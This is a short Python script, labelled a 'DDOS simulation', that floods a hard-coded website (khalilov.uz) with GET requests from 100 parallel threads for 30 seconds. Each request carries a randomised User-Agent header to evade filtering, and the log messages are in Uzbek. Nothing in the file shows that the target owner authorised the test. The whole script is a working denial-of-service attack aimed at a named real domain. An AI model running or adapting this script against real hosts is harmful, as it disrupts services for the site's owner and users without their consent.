import requests
import threading
import random
import time
from fake_useragent import UserAgent

URL = "http://khalilov.uz"
THREAD_COUNT = 100
ua = UserAgent()

def attack(thread_id):
    while True:
        try:
            headers = {"User-Agent": ua.random}
            response = requests.get(URL, headers=headers, timeout=3)
            print(f"Thread {thread_id}: So`rov yuborildi, Status: {response.status_code}")
        except requests.exceptions.RequestException:
            print(f"Thread {thread_id}: Server javob bermadi")
        time.sleep(random.uniform(0.1, 0.5))

def run_ddos_simulation():
    print(f"DDOS Simulation sarted: {THREAD_COUNT} thread")
    threads = []
    for i in range(THREAD_COUNT):
        t = threading.Thread(target=attack, args=(i,))
        t.daemon = True
        threads.append(t)
        t.start()
    time.sleep(30)
    print("Simulation Ended after 30 seconds")
    
if __name__ == "__main__":
    run_ddos_simulation()